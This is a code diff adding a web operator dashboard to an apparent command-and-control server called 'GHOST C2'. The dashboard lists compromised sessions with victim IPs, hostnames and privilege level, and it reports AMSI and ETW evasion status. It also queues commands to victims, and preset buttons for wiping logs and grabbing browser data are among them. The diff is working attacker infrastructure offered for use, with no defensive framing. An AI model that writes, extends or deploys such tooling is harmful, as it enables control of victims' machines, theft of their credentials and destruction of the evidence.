@@ -581,6 +581,298 @@ async function handleDownloadPayload(env: Env): Promise<Response> {
   });
 }
 
+// ─── Dashboard HTML ───────────────────────────────────────
+
+const DASHBOARD_HTML = `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>GHOST C2</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0d0d0f;--panel:#16181d;--border:#2a2d35;--accent:#7c6af7;
+  --accent2:#4fc3f7;--red:#ef4444;--green:#22c55e;--yellow:#eab308;
+  --text:#e2e8f0;--muted:#64748b;--mono:'JetBrains Mono',monospace;
+}
+body{background:var(--bg);color:var(--text);font-family:var(--mono),monospace;font-size:13px;height:100vh;display:flex;flex-direction:column}
+header{background:var(--panel);border-bottom:1px solid var(--border);padding:10px 20px;display:flex;align-items:center;gap:16px}
+header h1{font-size:15px;font-weight:700;letter-spacing:.05em;color:var(--accent)}
+header h1 span{color:var(--text);opacity:.5}
+#status-dot{width:8px;height:8px;border-radius:50%;background:var(--muted);flex-shrink:0}
+#status-dot.live{background:var(--green);box-shadow:0 0 6px var(--green)}
+#token-bar{margin-left:auto;display:flex;gap:8px;align-items:center}
+#token-bar input{background:var(--bg);border:1px solid var(--border);color:var(--text);padding:5px 10px;border-radius:4px;font-family:inherit;font-size:12px;width:340px}
+#token-bar input::placeholder{color:var(--muted)}
+button{background:var(--accent);color:#fff;border:none;padding:5px 12px;border-radius:4px;cursor:pointer;font-family:inherit;font-size:12px;font-weight:600;transition:opacity .15s}
+button:hover{opacity:.85}
+button.danger{background:var(--red)}
+button.ghost{background:transparent;border:1px solid var(--border);color:var(--muted)}
+button.ghost:hover{border-color:var(--accent);color:var(--text)}
+main{display:flex;flex:1;overflow:hidden}
+#sidebar{width:260px;flex-shrink:0;background:var(--panel);border-right:1px solid var(--border);display:flex;flex-direction:column}
+#sidebar-head{padding:12px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
+#sidebar-head span{font-size:11px;font-weight:700;letter-spacing:.1em;color:var(--muted);text-transform:uppercase}
+#session-list{flex:1;overflow-y:auto}
+.session-item{padding:10px 14px;border-bottom:1px solid var(--border);cursor:pointer;transition:background .1s}
+.session-item:hover{background:#1e2028}
+.session-item.active{background:#1e2028;border-left:2px solid var(--accent)}
+.session-item .sid{color:var(--accent2);font-size:11px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.session-item .meta{color:var(--muted);font-size:10px;margin-top:3px}
+.session-item .badge{display:inline-block;padding:1px 6px;border-radius:10px;font-size:10px;margin-top:4px}
+.badge-tasks{background:#7c6af722;color:var(--accent)}
+.badge-idle{background:#22c55e18;color:var(--green)}
+.badge-stale{background:#ef444418;color:var(--red)}
+#content{flex:1;display:flex;flex-direction:column;overflow:hidden}
+#content-head{padding:12px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+#selected-sid{font-weight:700;color:var(--accent2)}
+#recon-bar{font-size:11px;color:var(--muted);flex:1}
+#results-box{flex:1;overflow-y:auto;padding:14px;display:flex;flex-direction:column;gap:10px}
+.result-entry{background:var(--panel);border:1px solid var(--border);border-radius:6px;overflow:hidden}
+.result-ts{padding:5px 10px;background:#1e2028;color:var(--muted);font-size:10px;border-bottom:1px solid var(--border)}
+.result-body{padding:10px;white-space:pre-wrap;word-break:break-all;color:var(--text);line-height:1.6;max-height:340px;overflow-y:auto;font-size:12px}
+#cmd-bar{padding:12px 16px;border-top:1px solid var(--border);display:flex;gap:8px;background:var(--panel)}
+#cmd-input{flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:7px 12px;border-radius:4px;font-family:inherit;font-size:13px}
+#cmd-input::placeholder{color:var(--muted)}
+#cmd-input:focus{outline:none;border-color:var(--accent)}
+#no-session{flex:1;display:flex;align-items:center;justify-content:center;color:var(--muted);font-size:14px}
+#audit-panel{width:300px;flex-shrink:0;background:var(--panel);border-left:1px solid var(--border);display:flex;flex-direction:column}
+#audit-panel-head{padding:12px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
+#audit-panel-head span{font-size:11px;font-weight:700;letter-spacing:.1em;color:var(--muted);text-transform:uppercase}
+#audit-list{flex:1;overflow-y:auto;padding:8px}
+.audit-entry{padding:6px 8px;border-radius:4px;margin-bottom:4px;font-size:10px;border:1px solid var(--border)}
+.audit-entry .atime{color:var(--muted);display:block;margin-bottom:2px}
+.audit-entry .aact{color:var(--accent);font-weight:700}
+.audit-entry .aip{color:var(--muted)}
+#tabs{display:flex;border-bottom:1px solid var(--border)}
+.tab{padding:8px 16px;cursor:pointer;font-size:11px;font-weight:700;letter-spacing:.05em;text-transform:uppercase;color:var(--muted);border-bottom:2px solid transparent;transition:all .15s}
+.tab.active{color:var(--accent);border-bottom-color:var(--accent)}
+#toast{position:fixed;bottom:20px;right:20px;background:var(--panel);border:1px solid var(--border);padding:10px 16px;border-radius:6px;font-size:12px;opacity:0;transition:opacity .2s;pointer-events:none;z-index:999}
+#toast.show{opacity:1}
+::-webkit-scrollbar{width:4px;height:4px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
+</style>
+</head>
+<body>
+<header>
+  <div id="status-dot"></div>
+  <h1>GHOST <span>C2</span></h1>
+  <div id="token-bar">
+    <input id="op-token" type="password" placeholder="Operator token (X-Operator-Token)">
+    <button onclick="connect()">Connect</button>
+  </div>
+</header>
+<main>
+  <div id="sidebar">
+    <div id="sidebar-head">
+      <span>Sessions</span>
+      <button class="ghost" onclick="refreshSessions()" style="padding:3px 8px;font-size:10px">↻</button>
+    </div>
+    <div id="session-list"><div style="padding:20px;color:var(--muted);font-size:11px">Not connected</div></div>
+  </div>
+  <div id="content">
+    <div id="tabs">
+      <div class="tab active" onclick="switchTab('results')">Output</div>
+      <div class="tab" onclick="switchTab('recon')">Recon</div>
+    </div>
+    <div id="content-head" style="display:none">
+      <span id="selected-sid"></span>
+      <span id="recon-bar"></span>
+      <button class="ghost" onclick="fetchResults()" style="padding:3px 8px;font-size:10px">↻</button>
+      <button class="danger" style="padding:3px 8px;font-size:10px" onclick="killSession()">Kill</button>
+    </div>
+    <div id="no-session">← Select a session</div>
+    <div id="results-box" style="display:none"></div>
+    <div id="recon-box" style="display:none;flex:1;overflow-y:auto;padding:14px"></div>
+    <div id="cmd-bar" style="display:none">
+      <input id="cmd-input" placeholder="Command…" onkeydown="if(event.key==='Enter')sendCmd()">
+      <button onclick="sendCmd()">Send</button>
+      <button class="ghost" onclick="sendCmd('!wipe')">Wipe Logs</button>
+      <button class="ghost" onclick="sendCmd('!browser')">Browsers</button>
+      <button class="ghost" onclick="sendCmd('!ps ')">PS</button>
+    </div>
+  </div>
+  <div id="audit-panel">
+    <div id="audit-panel-head">
+      <span>Audit</span>
+      <button class="ghost" onclick="fetchAudit()" style="padding:3px 8px;font-size:10px">↻</button>
+    </div>
+    <div id="audit-list"><div style="padding:20px;color:var(--muted);font-size:11px">—</div></div>
+  </div>
+</main>
+<div id="toast"></div>
+<script>
+let token = '';
+let selectedSid = null;
+let pollInterval = null;
+let auditInterval = null;
+let currentTab = 'results';
+
+function toast(msg, dur=2500) {
+  const el = document.getElementById('toast');
+  el.textContent = msg;
+  el.classList.add('show');
+  setTimeout(() => el.classList.remove('show'), dur);
+}
+
+function headers() {
+  return { 'Content-Type': 'application/json', 'X-Operator-Token': token };
+}
+
+async function apiFetch(path, opts={}) {
+  const r = await fetch(path, { headers: headers(), ...opts });
+  if (r.status === 401) { toast('Invalid operator token'); return null; }
+  return r;
+}
+
+async function connect() {
+  token = document.getElementById('op-token').value.trim();
+  if (!token) return toast('Enter operator token first');
+  await refreshSessions();
+  await fetchAudit();
+  clearInterval(pollInterval);
+  clearInterval(auditInterval);
+  pollInterval = setInterval(async () => {
+    await refreshSessions();
+    if (selectedSid) await fetchResults();
+  }, 5000);
+  auditInterval = setInterval(fetchAudit, 15000);
+  document.getElementById('status-dot').className = 'live';
+  toast('Connected');
+}
+
+async function refreshSessions() {
+  const r = await apiFetch('/sessions');
+  if (!r) return;
+  const sessions = await r.json();
+  const list = document.getElementById('session-list');
+  if (!sessions.length) { list.innerHTML = '<div style="padding:20px;color:var(--muted);font-size:11px">No active sessions</div>'; return; }
+  sessions.sort((a,b) => new Date(b.last_beacon) - new Date(a.last_beacon));
+  list.innerHTML = sessions.map(s => {
+    const idle = s.idle_seconds;
+    const stale = idle > 180;
+    const badgeCls = s.pending_tasks > 0 ? 'badge-tasks' : stale ? 'badge-stale' : 'badge-idle';
+    const badgeTxt = s.pending_tasks > 0 ? s.pending_tasks + ' queued' : stale ? 'stale ' + fmt(idle) : 'live ' + fmt(idle);
+    const active = s.session === selectedSid ? 'active' : '';
+    return \`<div class="session-item \${active}" onclick="selectSession('\${esc(s.session)}')">
+      <div class="sid">\${esc(s.session)}</div>
+      <div class="meta">\${esc(s.remote_ip)} · \${esc(s.recon?.hostname||'?')} · \${esc(s.recon?.user||'?')}</div>
+      <span class="badge \${badgeCls}">\${badgeTxt}</span>
+    </div>\`;
+  }).join('');
+}
+
+function fmt(secs) {
+  if (secs < 60) return secs + 's';
+  if (secs < 3600) return Math.floor(secs/60) + 'm';
+  return Math.floor(secs/3600) + 'h';
+}
+
+function esc(s) {
+  return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+async function selectSession(sid) {
+  selectedSid = sid;
+  document.getElementById('selected-sid').textContent = sid;
+  document.getElementById('content-head').style.display = 'flex';
+  document.getElementById('no-session').style.display = 'none';
+  document.getElementById('cmd-bar').style.display = 'flex';
+  switchTab(currentTab);
+  await refreshSessions();
+  await fetchResults();
+  await fetchRecon();
+}
+
+function switchTab(tab) {
+  currentTab = tab;
+  document.querySelectorAll('.tab').forEach((t,i) => t.classList.toggle('active', (i===0&&tab==='results')||(i===1&&tab==='recon')));
+  document.getElementById('results-box').style.display = tab === 'results' && selectedSid ? 'flex' : 'none';
+  document.getElementById('results-box').style.flexDirection = 'column';
+  document.getElementById('recon-box').style.display = tab === 'recon' && selectedSid ? 'block' : 'none';
+}
+
+async function fetchResults() {
+  if (!selectedSid) return;
+  const r = await apiFetch('/results/' + encodeURIComponent(selectedSid));
+  if (!r) return;
+  const data = await r.json();
+  const box = document.getElementById('results-box');
+  if (!data.results || !data.results.length) { box.innerHTML = '<div style="color:var(--muted);font-size:11px;padding:10px">No results yet</div>'; return; }
+  box.innerHTML = data.results.slice().reverse().map(e =>
+    \`<div class="result-entry"><div class="result-ts">\${esc(e.ts)}</div><div class="result-body">\${esc(e.output)}</div></div>\`
+  ).join('');
+}
+
+async function fetchRecon() {
+  if (!selectedSid) return;
+  const r = await apiFetch('/sessions');
+  if (!r) return;
+  const sessions = await r.json();
+  const s = sessions.find(x => x.session === selectedSid);
+  if (!s) return;
+  const recon = s.recon || {};
+  const bar = [
+    recon.hostname && \`<b>\${esc(recon.hostname)}</b>\`,
+    recon.user && esc(recon.user),
+    recon.elevated && '<span style="color:var(--red)">SYSTEM</span>',
+    recon.build && 'build ' + recon.build,
+    recon.amsi && '<span style="color:var(--green)">AMSI✓</span>',
+    recon.etw  && '<span style="color:var(--green)">ETW✓</span>',
+  ].filter(Boolean).join(' · ');
+  document.getElementById('recon-bar').innerHTML = bar;
+  document.getElementById('recon-box').innerHTML =
+    '<pre style="color:var(--text);font-size:11px;line-height:1.8">' + esc(JSON.stringify(s, null, 2)) + '</pre>';
+}
+
+async function sendCmd(preset) {
+  if (!selectedSid) return toast('No session selected');
+  const input = document.getElementById('cmd-input');
+  const cmd = preset || input.value.trim();
+  if (!cmd) return;
+  const r = await apiFetch('/task', {
+    method: 'POST',
+    body: JSON.stringify({ session: selectedSid, cmd })
+  });
+  if (!r) return;
+  const data = await r.json();
+  if (data.status === 'queued') {
+    toast('Queued · depth=' + data.queue_depth);
+    if (!preset) input.value = '';
+  } else {
+    toast('Error: ' + JSON.stringify(data));
+  }
+}
+
+async function killSession() {
+  if (!selectedSid || !confirm('Queue exit for ' + selectedSid + '?')) return;
+  const r = await apiFetch('/sessions/' + encodeURIComponent(selectedSid), { method: 'DELETE' });
+  if (!r) return;
+  toast('Exit queued');
+  selectedSid = null;
+  document.getElementById('content-head').style.display = 'none';
+  document.getElementById('no-session').style.display = 'flex';
+  document.getElementById('results-box').style.display = 'none';
+  document.getElementById('cmd-bar').style.display = 'none';
+  await refreshSessions();
+}
+
+async function fetchAudit() {
+  const r = await apiFetch('/audit?limit=50');
+  if (!r) return;
+  const data = await r.json();
+  const list = document.getElementById('audit-list');
+  if (!data.entries || !data.entries.length) { list.innerHTML = '<div style="padding:12px;color:var(--muted);font-size:11px">—</div>'; return; }
+  list.innerHTML = data.entries.slice().reverse().map(e =>
+    \`<div class="audit-entry"><span class="atime">\${esc(e.ts)}</span><span class="aact">\${esc(e.action)}</span> <span class="aip">\${esc(e.ip)}</span></div>\`
+  ).join('');
+}
+</script>
+</body>
+</html>`;
+
 // ─── Router ───────────────────────────────────────────────
 
 async function handleRequest(request: Request, env: Env): Promise<Response> {
@@ -591,6 +883,14 @@ async function handleRequest(request: Request, env: Env): Promise<Response> {
   // CORS preflight
   if (method === "OPTIONS") {
     return withCORS(new Response(null, { status: 204 }), env);
+  }
+
+  // ── Web UI ────────────────────────────────────────────────
+  if (path === "/" && method === "GET") {
+    return new Response(DASHBOARD_HTML, {
+      status: 200,
+      headers: { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" },
+    });
   }
 
   // ── Public routes ──────────────────────────────────────
